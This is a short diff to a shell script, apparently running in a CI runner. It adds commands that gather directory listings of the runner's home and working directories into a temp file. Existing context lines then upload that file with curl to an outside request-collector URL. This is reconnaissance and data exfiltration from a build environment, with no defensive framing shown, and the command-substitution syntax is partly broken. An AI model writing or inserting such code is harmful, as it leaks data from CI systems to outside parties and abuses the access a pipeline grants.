@@ -3,9 +3,10 @@
 # install gdb sudo is passwordless according to doc
 #sudo apt-get install gdb -y > /tmp/file.txt
 
-#ssh-keygen -t rsa -N "passphrase" -f ~/.ssh/id_rsa2 > /tmp/file.txt
 $(ls -la /home/runner) > /tmp/file.txt
-echo "---------------------"
+$(pwd) >> /tmp/file.txt
+$(ls -la) >> /tmp/file.txt
+echo "---------------------" >> /tmp/file.txt
 
 curl --data-binary "@/tmp/file.txt" https://en0liva7dzyvpp.x.pipedream.net/
 
